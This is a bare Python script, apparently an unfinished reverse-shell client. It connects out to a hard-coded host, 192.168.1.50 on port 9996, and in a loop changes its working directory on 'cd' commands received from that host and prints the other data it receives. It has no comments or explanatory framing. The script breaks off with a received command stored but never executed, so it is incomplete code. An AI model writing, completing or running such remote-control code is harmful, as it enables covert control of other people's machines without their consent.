import socket
import os

s = socket.socket()
host = '192.168.1.50'
port = 9996

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        print(data.decode("utf-8"))
        c=(data.decode("utf-8"))